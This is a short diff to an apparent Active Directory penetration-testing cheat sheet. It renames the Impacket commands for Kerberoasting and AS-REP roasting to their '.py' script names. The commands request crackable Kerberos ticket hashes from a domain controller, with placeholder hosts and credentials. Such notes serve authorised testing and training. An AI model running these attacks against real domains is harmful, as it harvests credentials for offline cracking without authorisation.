@@ -14,7 +14,7 @@
 
 - Request a Kerberos 5 TGS-REP etype 23 hash from an SPN user account
 
-`$ GetUserSPNs -request -dc-ip <IP> <domain_name>/<username>:<password>`
+`$ GetUserSPNs.py -request -dc-ip <IP> <domain_name>/<username>:<password>`
 
 ### 1.3 - ASREPRoast
 
@@ -23,9 +23,9 @@
 - Request a Kerberos 5, etype 23, AS-REP hash from an NP user account
 
 ```
-$ GetNPUsers -request -dc-ip <IP> <domain_name>/<username>:<password>
+$ GetNPUsers.py -request -dc-ip <IP> <domain_name>/<username>:<password>
 
-$ GetNPUsers -request -dc-ip <IP> <domain_name> -usersfile users.txt
+$ GetNPUsers.py -request -dc-ip <IP> <domain_name> -usersfile users.txt
 ```
 
 ---
